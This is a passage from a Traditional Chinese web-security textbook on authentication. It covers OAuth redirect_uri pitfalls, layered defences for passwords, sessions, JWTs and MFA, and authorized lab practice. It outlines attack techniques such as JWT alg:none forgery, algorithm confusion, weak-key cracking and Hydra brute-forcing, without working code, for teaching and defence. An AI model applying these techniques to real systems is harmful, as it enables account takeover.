## 11.10 OAuth / SSO:委託授權的常見坑(點到即止)

「用 Google 登入」「用 Facebook 登入」——這背後是 **OAuth 2.0 / OpenID Connect(OIDC)** 與**單一登入(Single Sign-On,SSO)**。它讓你不用在每個網站都設一組帳密,而是委託一個「身分提供者(Identity Provider,IdP,如 Google)」來證明「你是誰」。這裡只建立概念與最常見的坑,深入實作不在本章。

極簡流程(授權碼流程 authorization code flow):

```
① 你在 app.com 點「用 Google 登入」
② app.com 把你導向 Google,並帶上「登入後要跳回哪」的 redirect_uri
③ 你在 Google 登入、同意授權
④ Google 把你導回 app.com 指定的 redirect_uri,並帶上一個「授權碼 code」
⑤ app.com 後端拿 code 去跟 Google 換 token → 確認你是誰 → 登入完成
```

兩個最經典的坑:

- **`redirect_uri` 驗證不嚴 → 授權碼/token 被劫**:第 ④ 步,Google 會把授權碼送到 `redirect_uri`。如果 app.com(或 Google 端設定)對這個 URI **驗得太鬆**(如只比對開頭、允許萬用比對、允許 open redirect),攻擊者就能構造一個 `redirect_uri` 把授權碼**導向攻擊者的網址**,攔截到 code 後冒充受害者換 token。**防禦:`redirect_uri` 必須是「完全比對(exact match)」的白名單**——這又是第 09、10 章「白名單勝過黑名單」的老道理,連 OAuth 也一樣。
- **token 洩漏**:access token / id token 若透過不當管道傳遞(放進 URL 被 Referer 帶走、存進不安全的地方、透過 XSS 被讀走),等同帳號被接管。防禦呼應前面各節:token 走安全通道、別進 URL、前端別亂存、站上先沒有 XSS。

> **關鍵認知**:OAuth 的坑幾乎都是「**信任邊界沒守好**」的老問題換個場景——`redirect_uri` 沒嚴格白名單(信任了攻擊者能控制的跳轉目標)、token 外洩(該保密的憑證跑到不該去的地方)。你會發現本章、上一章的心智模型在這裡完全通用。順帶一提:OAuth 名字裡的 "Auth" 常讓人以為它是「認證」,其實 OAuth 2.0 本質是**授權**框架(委託存取),要做「認證(證明你是誰)」得靠架在它上面的 **OIDC**——這也呼應 11.1 認證/授權之分。

## 11.11 【重點】防禦:把認證這道地基打實

防禦要寫得比攻擊更詳盡。認證的防禦是**縱深防禦**——密碼層、session 層、token 層、MFA 層一層層疊起來,一層破了還有下一層。逐層講清楚。

### 一、密碼儲存與政策:別強制複雜,要鼓勵夠長

**① 慢雜湊儲存,永遠別存明文。** 資料庫存的必須是「單向、加鹽、慢速」的雜湊,而不是明文、更不是 MD5/SHA1 這種**快速**雜湊(快 = 好爆破)。用**專為密碼設計的慢雜湊**:**bcrypt、scrypt、argon2**(argon2id 是現代首選)。它們刻意「算得慢」+「每個密碼加獨立的鹽(salt)」,讓離線爆破的成本高到不划算(原理與破解在第 15、17 章展開)。

```
✘ 明文:        password123                        (拖庫即全滅)
✘ 快雜湊:      MD5("password123") = 482c811...     (每秒可試數十億次,秒破)
✔ 慢雜湊加鹽:  argon2id(密碼, 隨機鹽, 高成本參數)   (每次驗證刻意耗時,爆破成本極高)
```

**② 密碼政策:採用 NIST 的新觀念——長度 > 複雜度。** 傳統那套「必須含大小寫+數字+符號、每 90 天強制改一次」的規定,已被 NIST(SP 800-63B)認定**弊大於利**:

| 舊觀念(別再用) | 新觀念(NIST SP 800-63B) | 為什麼 |
|-----------------|--------------------------|--------|
| 強制大小寫+數字+符號 | 只要求**足夠長度**(如 ≥12),不強制字元組合 | 複雜度規則逼出的是 `Password1!` 這種可預測變體;長度才是抗暴力的關鍵 |
| 每 60/90 天強制改密碼 | **不強制定期改**,只在「有外洩跡象」時要求改 | 強制定期改逼使用者用 `Pass01`→`Pass02` 這種弱規律,反而更好猜 |
| 隨便設 | **比對「已知外洩密碼庫」**,禁用已外洩/常見密碼 | 直接擋掉撞庫和字典攻擊最愛的那些密碼 |
| 允許密碼提示、限制長度上限 | 允許長密碼/密碼片語(passphrase)、支援貼上 | 鼓勵「四個隨機單字」這類好記又長的密碼 |

> **關鍵認知**:讓使用者記一串 `X#9k!` 不如讓他用一句 `紫色大象吃了三個鬧鐘` ——後者又長又好記又難暴力。**「長度勝過複雜度、別瞎折騰使用者定期改」是這幾年密碼政策最重要的觀念翻轉**,別再抱著 2005 年那套。

### 二、擋線上猜測:rate limit + 鎖定 + CAPTCHA + 異常偵測

針對 11.2 的線上攻擊,四招搭配:

- **Rate limiting(限速)**:限制「單一 IP / 單一帳號」單位時間內的登入嘗試次數,直接掐死 Hydra 那種高速猜測。
- **帳號鎖定(account lockout)**:單一帳號連續失敗 N 次,暫時鎖定或加入指數退避(每次失敗等待時間翻倍)。**注意副作用**:純粹的「連錯就鎖」會被攻擊者拿來當**阻斷服務**(故意連錯把別人鎖死),所以現代多用「漸進式延遲 + 需要額外驗證」而非直接硬鎖。
- **CAPTCHA**:在偵測到異常(多次失敗、可疑來源)時跳出人機驗證,擋自動化腳本。
- **跨帳號異常偵測(擋密碼噴灑的關鍵)**:11.2 說過,噴灑讓每個帳號只錯一次、避開 per-account 鎖定。**唯一能擋它的是「橫向監控」**——盯「同一來源 IP / 短時間內,是否對『大量不同帳號』發起失敗登入」,以及「不可能的移動(impossible travel)」等行為訊號。這屬於第 20 章偵測與監控的範疇。

### 三、安全的 session 設定

把 11.3–11.6 的坑對應到具體設定:

```
Set-Cookie: session=<高熵隨機SID>; HttpOnly; Secure; SameSite=Lax; Path=/
```

- **SID 高熵**:用 CSPRNG 產生、夠長,讓人猜不到(擋 11.4 的可預測 SID)。
- **`HttpOnly`**:JS 讀不到,擋 XSS 偷 cookie(第 09 章)。
- **`Secure`**:只走 HTTPS,擋明文竊聽。
- **`SameSite=Lax/Strict`**:跨站不自動帶 cookie,順帶緩解 CSRF(第 10 章)。
- **登入後換發 SID**:`session_regenerate_id(true)` 之類——**擋 session fixation**(11.5),一石二鳥同時降低劫持殘留。
- **伺服器端可撤銷**:登出、改密碼、偵測到異常時,**在伺服器端作廢** session(11.6),不只是刪 cookie。
- **雙逾時**:設定閒置逾時 + 絕對逾時(11.6)。

### 四、JWT 最佳實踐(對症 11.8 五大錯誤)

| 做法 | 對治哪個錯誤 |
|------|-------------|
| **伺服器端明確寫死允許的演算法**(不信任 token 的 `alg`) | ①`alg:none`、③RS256→HS256 混淆 |
| **一律 `verify` 驗簽,絕不用 `decode` 做認證判斷** | ④不驗簽 |
| **HMAC 密鑰高熵夠長、當機密保管、別進原始碼** | ②弱密鑰 |
| **`exp` 設短(分鐘級)+ 確認函式庫檢查 exp**,搭 refresh token | ⑤不檢查過期 |
| **敏感操作別只靠 JWT**——改密碼/付款要重新認證或二次確認 | 減災(即使 token 被偽造/竊取也擋一層) |
| **需要「可撤銷」時,考慮不透明 token(opaque token)或維護撤銷清單** | 補 JWT 無狀態難撤銷之短(11.6) |

> **關鍵認知**:JWT 不是「比 session 更安全」,只是「**無狀態、好擴展**」——它把「可即時撤銷」這個好處換掉了。如果你的系統很需要「登出即失效、被盜能馬上斷」,**傳統伺服器端 session、或不透明 token(opaque token,票號在伺服器可查可撤)反而更合適**。別因為 JWT 潮就無腦上——選型要看「你需不需要即時撤銷」。

### 五、全面上 MFA

如 11.9,MFA 是擋撞庫/噴灑 CP 值最高的一招。原則:

- **至少對高風險帳號(管理員)與敏感操作強制 MFA**,理想是全面覆蓋。
- **優先 phishing-resistant 的 FIDO2/passkey**;簡訊 OTP 聊勝於無但最弱(SIM swap、即時釣魚),能升級就升級。
- **敏感操作做 step-up 認證**:平時登入夠用就好,但改密碼、大額付款時再要求一次強驗證(呼應第 10 章敏感操作二次確認、11.6「記住我」的坑)。

**認證防禦總覽(縱深防禦)**:

| 層 | 手段 | 對治 |
|----|------|------|
| 密碼儲存 | argon2/bcrypt 慢雜湊加鹽,絕不明文/快雜湊 | 拖庫後的離線破解(第 15 章) |
| 密碼政策 | NIST:長度>複雜度、不強制定期改、比對外洩庫 | 字典/暴力/撞庫 |
| 線上防猜 | rate limit + 漸進鎖定 + CAPTCHA + 跨帳號異常偵測 | 暴力、字典、噴灑 |
| Session | HttpOnly/Secure/SameSite + 登入換發SID + 伺服器可撤銷 + 雙逾時 | 劫持、fixation、登出/逾時坑 |
| JWT | 寫死演算法 + verify + 強密鑰 + 短exp + 敏感操作不只靠JWT | JWT 五大錯誤 |
| 多因素 | 全面 MFA,優先 FIDO2/passkey | 撞庫、噴灑、釣魚 |

## 11.12 靶場練習:在授權環境動手

> **再次強調**:以下練習**只在你自己搭的靶場或官方授權平台**進行(第 00、01 章)。暴力破解、偽造 token 冒充身分、劫持 session——這些行為對未授權目標進行,踩的是《刑法》§358 入侵、§359 破壞電磁紀錄、§360 干擾的紅線。DVWA、Juice Shop、PortSwigger Academy 都是「明確授權你攻擊」的環境,用它們練是合法且安全的。

### DVWA —— 練暴力破解入門

| 模組 | 對應 | 練習重點 |
|------|------|---------|
| **Brute Force** | 11.2 | Low 難度:用 Hydra 或 Burp Intruder 對登入表單跑字典,體會「無限次嘗試」的危險。調到 High 難度後,觀察它加了什麼(rate limit / token / 延遲),再想「這擋得住噴灑嗎」 |

**建議練法**:把難度從 Low 調到 High,每級開 View Source 看它加了哪層防禦(呼應第 00 章「攻完想防」)。也用 Burp Suite(第 06 章)的 Intruder 手動感受「怎麼自動化猜測」與「登入失敗訊息如何被當成成敗判斷依據」。

### OWASP Juice Shop —— JWT 與認證關卡

Juice Shop(現代 Angular + Node 靶場,第 09、10 章介紹過)有一整批認證與 JWT 題目,非常貼近真實 API:

- **JWT 相關關卡**:攔下 JWT、Base64 解出 payload(印證 11.7「payload 只是編碼」)、嘗試 `alg:none` 偽造、把 `email/role` 改成管理員——把 11.8 的錯誤一個個實作過。
- **認證關卡**:弱密碼、忘記密碼流程的邏輯缺陷、以他人身分登入等。
- 內建計分板,解出來記點,適合按部就班闖關。用 Docker 起一個容器就有(第 01 章、Docker 課程 `../docker/README.md`),打壞了砍掉重來、完全隔離。

### PortSwigger Web Security Academy —— 最系統的 authentication / JWT labs

PortSwigger Academy(Burp 官方免費靶場,第 06 章)是練這兩塊**最完整**的地方,關卡循序漸進、每關對應一個具體的認證/JWT 缺陷:

- **Authentication labs**:密碼暴力破解、繞過雙因素、「保持登入」cookie 的缺陷、帳號列舉(從錯誤訊息差異推出帳號存不存在)、密碼重設流程漏洞——把 11.2、11.6、11.10 的坑逐一實作。
- **JWT labs**:從「不驗簽」「`alg:none`」到「弱密鑰爆破(配 hashcat)」「RS256→HS256 演算法混淆」「JWK/JKU header 注入」——**把 11.8 的五大錯誤一關一關親手打穿**,這是本章最推薦的實作。

> 用 Burp 攔下 token、改 header 的 `alg`、改 payload 的 `role`、重算簽章再送出——JWT 的「簽章驗證做錯會怎樣」會在你手上變得無比具體。

## 11.13 本章小結

- **認證(你是誰)vs 授權(你能做什麼)**:先認證再授權;`401` 是未認證、`403` 是已認證但未授權。本章專打認證(冒用身分),越權(IDOR)留第 12 章。
- **密碼攻擊是一個家族,別混為一談**:暴力(窮舉)、字典(猜常見)、憑證填充/撞庫(拿別站外洩帳密來試,利用「重複用密碼」)、密碼噴灑(少數密碼配大量帳號,專門避開帳號鎖定)、預設密碼。線上猜測工具點到 Hydra,深入破解在第 15 章。
- **Session = 衣帽間號碼牌**:身分存伺服器端,cookie 只有隨機票號。**登入後那張票的價值等同密碼**。兩大攻擊:**劫持**(事後偷票,回扣 XSS/HttpOnly)、**fixation**(事前塞給你一張攻擊者握有副本的票,病根是「登入後 SID 沒換發」)。別忘了登出要伺服器端作廢、要設雙逾時、「記住我」別無限授權。
- **JWT 三段 `header.payload.signature`,全是 Base64URL 編碼不是加密**——payload 人人可讀,絕不放機密;安全**全押在簽章驗證做對**。
- **JWT 五大致命錯誤**:①`alg:none`(讓伺服器跳過驗簽)②弱 HMAC 密鑰(hashcat 離線爆破)③RS256→HS256 混淆(拿公鑰當對稱密鑰偽簽)④根本不驗簽(只 decode)⑤不檢查 exp(舊票永久有效)。前三個共同的根因是「**讓 token 自報的 `alg` 決定怎麼驗**」——正解是**伺服器寫死演算法**。
- **MFA 是擋撞庫/噴灑 CP 值最高的一招**,但簡訊/App OTP 會被即時釣魚、SIM swap 繞過;**phishing-resistant 的 FIDO2/passkey** 用「綁定網域的公私鑰簽章」把「判斷網域對不對」交給密碼學,才真正抗釣魚。
- **OAuth/SSO 的坑**幾乎都是老問題換場景:`redirect_uri` 必須完全比對白名單、token 別外洩。OAuth 本質是授權,認證要靠 OIDC(呼應 11.1)。
- **防禦是縱深的**:慢雜湊儲存(argon2/bcrypt)、NIST 新密碼觀念(長度>複雜度、別強制定期改、比對外洩庫)、rate limit+漸進鎖定+CAPTCHA+跨帳號異常偵測、安全 session 設定(HttpOnly/Secure/SameSite+登入換發SID+伺服器可撤銷)、JWT 最佳實踐(寫死演算法+verify+強密鑰+短exp)、全面上 MFA。

> **下一章預告**:本章把「**你是誰**」這道關卡打穿——冒用身分、偷票、偽造 token。但攻擊者就算**沒能變成別人、還是他自己**,依然可能碰到不該碰的東西。第 12 章要打的是**存取控制與業務邏輯漏洞**:我改一下 URL 的 `id=123` 就看到別人的訂單(**IDOR**)、我這個一般會員直接呼叫 `/admin` 端點就成了管理員(**越權 privilege escalation**)、我把購物車金額改成負數就倒賺(業務邏輯漏洞)。如果說本章解決「你是誰」,下一章打的就是「**你是你沒錯,但你憑什麼碰這個東西**」——認證之後,那道同樣脆弱、卻更常被忽略的授權關卡。
